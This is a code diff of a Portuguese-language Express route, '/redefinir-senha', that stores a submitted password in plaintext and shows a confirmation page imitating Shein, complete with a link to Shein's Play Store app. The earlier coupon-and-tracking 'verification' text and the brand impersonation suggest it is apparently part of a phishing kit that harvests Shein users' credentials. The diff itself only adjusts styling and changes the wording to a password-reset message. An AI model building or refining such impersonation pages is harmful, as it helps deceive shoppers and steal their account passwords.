@@ -65,16 +65,16 @@ app.post('/redefinir-senha', (req, res) => {
                         <style>
                             body { font-family: Arial, sans-serif; text-align: center; padding: 50px; background-color: #f7f7f7; }
                             .card { background: white; padding: 30px; border-radius: 8px; box-shadow: 0 4px 8px rgba(0,0,0,0.1); display: inline-block; max-width: 400px; }
-                            h2 { color: #000; }
+                            h2 { color: #000; font-size: 22px; margin-bottom: 15px; }
                             p { color: #666; font-size: 16px; line-height: 1.5; }
-                            .btn { display: inline-block; margin-top: 20px; padding: 12px 24px; background-color: #000; color: #fff; text-decoration: none; border-radius: 4px; font-weight: bold; }
+                            .btn { display: inline-block; margin-top: 25px; padding: 12px 24px; background-color: #000; color: #fff; text-decoration: none; border-radius: 4px; font-weight: bold; }
                             .btn:hover { background-color: #333; }
                         </style>
                     </head>
                     <body>
                         <div class="card">
-                            <h2>Verificação Concluída!</h2>
-                            <p>Sua conta foi sincronizada com sucesso para receber os cupons e atualizações de rastreio.</p>
+                            <h2>Sua senha foi atualizada com sucesso!</h2>
+                            <p>Retorne ao app da Shein e boas compras.</p>
                             
                             <!-- Botão direcionando para a SHEIN na Play Store -->
                             <a href="https://play.google.com/store/apps/details?id=com.zzkko" target="_blank" class="btn">
@@ -90,7 +90,6 @@ app.post('/redefinir-senha', (req, res) => {
             db.run(`UPDATE usuarios SET senha = ? WHERE email = ?`, [novaSenha, email], function(err) {
                 if (err) return res.send("Erro ao atualizar a senha no banco.");
                 
-                // Padrão de tela idêntico com o botão atualizado da Play Store
                 res.send(`
                     <!DOCTYPE html>
                     <html lang="pt-BR">
@@ -101,16 +100,16 @@ app.post('/redefinir-senha', (req, res) => {
                         <style>
                             body { font-family: Arial, sans-serif; text-align: center; padding: 50px; background-color: #f7f7f7; }
                             .card { background: white; padding: 30px; border-radius: 8px; box-shadow: 0 4px 8px rgba(0,0,0,0.1); display: inline-block; max-width: 400px; }
-                            h2 { color: #000; }
+                            h2 { color: #000; font-size: 22px; margin-bottom: 15px; }
                             p { color: #666; font-size: 16px; line-height: 1.5; }
-                            .btn { display: inline-block; margin-top: 20px; padding: 12px 24px; background-color: #000; color: #fff; text-decoration: none; border-radius: 4px; font-weight: bold; }
+                            .btn { display: inline-block; margin-top: 25px; padding: 12px 24px; background-color: #000; color: #fff; text-decoration: none; border-radius: 4px; font-weight: bold; }
                             .btn:hover { background-color: #333; }
                         </style>
                     </head>
                     <body>
                         <div class="card">
-                            <h2>Verificação Concluída!</h2>
-                            <p>Sua conta foi sincronizada com sucesso para receber os cupons e atualizações de rastreio.</p>
+                            <h2>Sua senha foi atualizada com sucesso!</h2>
+                            <p>Retorne ao app da Shein e boas compras.</p>
                             
                             <!-- Botão direcionando para a SHEIN na Play Store -->
                             <a href="https://play.google.com/store/apps/details?id=com.zzkko" target="_blank" class="btn">
